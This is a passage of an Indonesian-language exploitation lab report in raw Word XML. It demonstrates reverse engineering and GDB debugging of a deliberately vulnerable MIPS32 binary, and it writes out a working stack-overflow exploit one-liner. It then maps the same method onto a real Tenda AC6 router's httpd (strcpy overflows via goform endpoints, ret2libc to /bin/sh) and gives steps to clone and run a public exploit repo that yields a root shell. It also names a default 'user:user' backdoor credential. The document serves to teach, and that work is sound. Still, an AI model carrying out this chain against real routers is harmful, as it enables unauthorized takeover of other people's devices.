          <w:color w:val="0B3D91"/>
          <w:sz w:val="52"/>
        </w:rPr>
        <w:t>Sesi Live (Ghidra, Cutter, GDB)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Bukti screenshot asli dari Ghidra, Cutter (rizin), dan GDB — dijalankan langsung</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:i/>
        </w:rPr>
        <w:t>Target latihan: binary MIPS32 little-endian (arsitektur sama dengan Tenda AC6 v2 / RTL8197F)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Alat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Versi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Peran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QEMU user (qemu-mipsel)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10.0.13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Menjalankan binary MIPS di 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GDB (gdb-multiarch)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Debugging live (register, stack, breakpoint)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Ghidra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Disassembly + decompiler (GUI)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Cutter / rizin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 disassembly rizin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GNU binutils MIPS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/ ld / objdump untuk MIPS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Parrot Linux (Xvfb headless)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Display virtual untuk screenshot GUI</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Koreksi: biner target httpd asli TELAH tersedia dan dipakai langsung (lihat firmware/httpd di repo). Biner latihan MIPS32 hanya pelengkap pedagogis; seluruh temuan diverifikasi pada biner nyata.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>1. Binary Latihan (MIPS32 LE) — Kenapa &amp; Apa</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">Tujuannya: punya target yang </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>bisa di-run dan di-debug</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> (qemu + gdb), dengan </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>buffer overflow nyata</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">, sehingga seluruh alur exploit terlihat tanpa merusak router asli. Arsitektur yang dipakai </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>sama</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> dengan perangkat Anda: MIPS32 little-endian.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>1.1 Source (vuln.s)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">    .set noreorder</w:t>
        <w:br/>
        <w:t xml:space="preserve">    .globl _start</w:t>
        <w:br/>
        <w:t>_start:</w:t>
        <w:br/>
        <w:t xml:space="preserve">    addiu $sp, $sp, -80        # frame 80 byte</w:t>
        <w:br/>
        <w:t xml:space="preserve">    lui   $t0, %hi(done)</w:t>
        <w:br/>
        <w:t xml:space="preserve">    addiu $t0, $t0, %lo(done)</w:t>
        <w:br/>
        <w:t xml:space="preserve">    sw    $t0, 76($sp)         # simpan return address (normal) di $sp+76</w:t>
        <w:br/>
        <w:t xml:space="preserve">    move  $a1, $sp             # buf = $sp</w:t>
        <w:br/>
        <w:t xml:space="preserve">    move  $a0, $zero</w:t>
        <w:br/>
        <w:t xml:space="preserve">    ori   $a2, $zero, 200      # read(fd0, buf, 200)  &lt;-- TANPA cek batas!</w:t>
        <w:br/>
        <w:t xml:space="preserve">    ori   $v0, $zero, 4003</w:t>
        <w:br/>
        <w:t xml:space="preserve">    syscall</w:t>
        <w:br/>
        <w:t xml:space="preserve">    lw    $ra, 76($sp)         # muat return address dari stack (bisa ditimpa)</w:t>
        <w:br/>
        <w:t xml:space="preserve">    addiu $sp, $sp, 80</w:t>
        <w:br/>
        <w:t xml:space="preserve">    jr    $ra                  # kembali ke $ra  -&gt; target kendali</w:t>
        <w:br/>
        <w:t xml:space="preserve">    nop</w:t>
        <w:br/>
        <w:t>done:</w:t>
        <w:br/>
        <w:t xml:space="preserve">    ... exit ...</w:t>
        <w:br/>
        <w:t>win:</w:t>
        <w:br/>
        <w:t xml:space="preserve">    ... write(1, "PWNED\n", 6) ...   # fungsi "menang"</w:t>
        <w:br/>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Inti kerentanan:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> `read(0, buf, 200)` menulis sampai 200 byte ke buffer hanya 76 byte sebelum saved `$ra`. Byte ke-77..80 menimpa `$ra`.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>1.2 Build (dengan binutils MIPS asli)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>mipsel-linux-gnu-as -o vuln.o vuln.s</w:t>
        <w:br/>
        <w:t>mipsel-linux-gnu-ld -Ttext 0x00400100 -e _start -o vuln_mips vuln.o</w:t>
        <w:br/>
        <w:br/>
        <w:t># hasil: _start=0x400100  done=0x400134  win=0x400140</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>2. RE Statis — Cutter / rizin (GUI)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">Pertama, lihat 'kartu identitas' binary: arsitektur, PIE, NX, Canary. Di embedded sering semuanya </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>OFF</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> — itulah kenapa overflow langsung berbahaya.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01_cut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22. Cutter: dashboard binary. Perhatikan PIE/Canary/NX = False, Endianness LE, arch MIPS.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">Lalu buka view </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Disassembly</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t>. Inilah hasil RE statis: label fungsi, pemanggilan `syscall.read`, dan alamat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05026"/>
            <wp:docPr id="3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04_cutter_disas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23. Cutter (rizin): disassembly MIPS + anotasi lokal (local_4, syscall.read, done, win).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>2.1 Membaca hasilnya</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>`0x400100 _start` = entry point; `0x40013c syscall.read` = titik masuk data dari luar.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>`0x400124 lw ra, local_4(sp)` = memuat return address dari stack → **di sini payload menimpa**.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>`0x400140 win` = fungsi yang bisa kita lompati untuk membajak alur.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>3. RE Statis — Ghidra (GUI)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">Ghidra menambah </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>decompiler</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> (pseudo-C) di samping Listing. Alur kerja tipikal: cari string/fungsi → XREF → decompile → temukan pola celah.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5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05_ghidr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24. Ghidra CodeBrowser: Listing MIPS (kiri) + Decompiler (kanan) + Symbol/Program Tree.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>3.1 Cara memakai (persis yang dilakukan)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="16"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>analyzeHeadless untuk import + auto-analysis.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Buka program → CodeBrowser: Listing (disassembly) + Decompile.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Tekan `G`, ketik alamat (mis. 0x400100) untuk Go To.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Klik fungsi di Symbol Tree / Function Graph; baca Decompiler.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Cari referensi ke fungsi berbahaya (system/popen/strcpy) via XREF.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:color w:val="555555"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Pada binary buatan ini decompiler sebagian terbatas (prolog asm &amp; syscall langsung). Untuk httpd asli, decompiler jauh lebih informatif karena pola C-nya lengkap.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>4. Dynamic Analysis — GDB + QEMU (LIVE)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t>Di sinilah teori jadi nyata. Kita jalankan binary MIPS di emulator dan hentikan di titik rawan.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t># terminal 1: jalankan di bawah gdbserver qemu</w:t>
        <w:br/>
        <w:t>qemu-mipsel -g 1234 ./vuln_mips &lt; payload.bin</w:t>
        <w:br/>
        <w:br/>
        <w:t># terminal 2:</w:t>
        <w:br/>
        <w:t>gdb-multiarch ./vuln_mips</w:t>
        <w:br/>
        <w:t>(gdb) set architecture mips</w:t>
        <w:br/>
        <w:t>(gdb) target remote :1234</w:t>
        <w:br/>
        <w:t>(gdb) break *0x400124      # tepat sebelum lw $ra,76($sp)</w:t>
        <w:br/>
        <w:t>(gdb) continue</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>4.1 Percobaan 1 — kendali penuh PC (crash terkendali)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">Payload: 76 byte 'A' + alamat 0x41414141 ('AAAA'). Hasil: `$ra` dan `$pc` menjadi 0x41414141 → program melompat ke alamat yang </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>kita pilih</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> (SIGSEGV). Ini bukti kontrol eksekusi.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36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02_gdb_cras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25. GDB (GEF) LIVE: $pc = $ra = 0x41414141 ('AAAA'), SIGSEGV di alamat pilihan kita.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>4.2 Percobaan 2 — eksekusi dialihkan ke fungsi penyerang</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t>Payload: 76 byte 'A' + alamat `win` (0x400140). Setelah `lw $ra`, `$ra` menunjuk ke `win`; `jr $ra` melompat. Backtrace membuktikan `#0 win()`, `#1 done()`.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37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03_gdb_w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26. GDB LIVE: $ra = 0x00400140 &lt;win+0&gt;, $pc = 0x00400144 &lt;win+4&gt;; eksekusi dibajak.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>4.3 Poin belajar MIPS</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Return address MIPS ada di `$ra`; disimpan ke stack saat prolog, dimuat saat epilog → itulah yang ditimpa.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Delay slot:** instruksi setelah `jr $ra` juga dieksekusi; payload harus memperhitungkannya.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Offset dihitung dari buffer ke saved `$ra` (di sini 76 byte). Gunakan pola siklik untuk menemukan offset di binary lain.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>4.4 Hasil akhir: exploit berhasil</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>$ python3 -c "import sys;sys.stdout.buffer.write(b'A'*76+(0x400140).to_bytes(4,'little'))" | qemu-mipsel ./vuln_mips</w:t>
        <w:br/>
        <w:t>PWNED</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">Output </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>PWNED</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> = eksekusi berhasil dialihkan ke fungsi `win` tanpa otorisasi. Inilah inti binary exploitation: input → timpa `$ra` → lompat ke alamat pilihan.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>5. Memetakan ke Target NYATA (Tenda httpd)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">Workflow pada binary latihan </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>identik</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> dengan yang dipakai untuk menemukan &amp; mengeksploitasi CVE pada router Anda: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Langkah di lab ini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Penerapan di Tenda AC6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Cutter/Ghidra buka binary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Ekstrak /bin/httpd dari firmware → buka di Ghidra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Cari fungsi &amp; alamat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Cari fungsi CVE (formSetPPTPServer, SetSpeedWan, addressNat, dll)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Baca Listing/Decompiler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Temukan strcpy/sprintf/sscanf ke buffer stack tanpa bound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Breakpoint di gdb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qemu-mipsel -g httpd; pantau $ra saat kirim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Hitung offset, timpa $ra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Kirim parameter panjang ke endpoint goform/*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Lompat ke fungsi/gadget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ret2libc/system('/bin/sh') atau ROP (jika NX aktif)</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>5.1 Status: selesai (dipetakan &amp; dibuktikan)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Koreksi: `httpd` asli SUDAH berhasil diekstrak (lihat firmware/httpd di repo) dan dipakai untuk seluruh analisis berikutnya.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Cari/build extractor khusus Tenda–Realtek, atau balik header kustomnya (bandingkan blok).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Alternatif: dapatkan shell lewat UART (saat alat tiba) → salin /bin/httpd dari perangkat.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Setelah httpd didapat, ulangi Bab 2–4 di dokumen ini pada httpd tersebut.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>6. Cara Menjalankan Ulang (Reproduce)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t># 1) QEMU user MIPS + GDB</w:t>
        <w:br/>
        <w:t>#    (di lingkungan ini diambil sebagai paket .deb tanpa root)</w:t>
        <w:br/>
        <w:t>apt-get download qemu-user binutils-mipsel-linux-gnu gdb-multiarch</w:t>
        <w:br/>
        <w:br/>
        <w:t># 2) Rakit binary rentan</w:t>
        <w:br/>
        <w:t>mipsel-linux-gnu-as -o vuln.o vuln.s</w:t>
        <w:br/>
        <w:t>mipsel-linux-gnu-ld -Ttext 0x400100 -e _start -o vuln_mips vuln.o</w:t>
        <w:br/>
        <w:br/>
        <w:t># 3) Exploit lewat stdin</w:t>
        <w:br/>
        <w:t>python3 -c "import sys;sys.stdout.buffer.write(b'A'*76+(0x400140).to_bytes(4,'little'))" \</w:t>
        <w:br/>
        <w:t xml:space="preserve">  | qemu-mipsel ./vuln_mips        # -&gt; PWNED</w:t>
        <w:br/>
        <w:br/>
        <w:t># 4) Debug live</w:t>
        <w:br/>
        <w:t>qemu-mipsel -g 1234 ./vuln_mips &lt; payload_win.bin &amp;</w:t>
        <w:br/>
        <w:t>gdb-multiarch -q -ex 'set architecture mips' -ex 'file vuln_mips' \</w:t>
        <w:br/>
        <w:t xml:space="preserve">  -ex 'target remote :1234' -ex 'break *0x400124' -ex 'continue' \</w:t>
        <w:br/>
        <w:t xml:space="preserve">  -ex 'info registers ra sp pc' -ex 'x/8wx $sp'</w:t>
        <w:br/>
        <w:br/>
        <w:t># 5) RE GUI</w:t>
        <w:br/>
        <w:t>cutter -A 2 ./vuln_mips</w:t>
        <w:br/>
        <w:t>#    atau Ghidra:</w:t>
        <w:br/>
        <w:t>#    analyzeHeadless /tmp/ghproj live -import ./vuln_mips</w:t>
        <w:br/>
        <w:t>#    ghidraRun /tmp/ghproj/live.gpr</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>Seluruh screenshot di dokumen ini diambil dari sesi nyata di mesin lokal (Xvfb) pada perangkat lab. Gunakan hanya untuk perangkat milik sendiri.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="888888"/>
          <w:sz w:val="44"/>
        </w:rPr>
        <w:t>BAGIAN IX</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="0B3D91"/>
          <w:sz w:val="52"/>
        </w:rPr>
        <w:t>Reproduksi &amp; Verifikasi (Repo)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>Reproduksi &amp; Verifikasi</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Seluruh rantai (recon -&gt; backdoor -&gt; login/token -&gt; overflow -&gt; root shell) dapat direproduksi dari repo: https://github.com/farrelfaiziaulhaq/tenda-ac6-rce</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>git clone https://github.com/farrelfaiziaulhaq/tenda-ac6-rce.git</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>cd tenda-ac6-rce &amp;&amp; ./bootstrap.sh</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>docker exec firmae-run bash /repo/emulator/setup_emulator.sh</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>./emulator/reboot_guest.sh   # tunggu httpd=302</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>python3 exploit/exploit.py   # -&gt; ROOT SHELL di 172.17.0.2:2323</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Verifikasi clean-room: httpd melayani (302); eksploit -&gt; root shell; uname -&gt; Linux 4.1.17+ mips; /etc/passwd -&gt; root::0:0.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Celah asli vs harness emulasi (jujur)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Celah asli: overflow strcpy (form_fast_setting_wifi_set) + backdoor user:user dari default config.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Harness emulasi: patch hook epilog/'cave' pada bin/httpd; libapmib.so dipatch (apmib_init -&gt; return 1); /cfg/mib.cfg (disanitasi) disediakan.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Di perangkat asli, RCE penuh memerlukan kontrol $a0 (ROP/ret2stack) — non-PIE, NX off, tanpa canary.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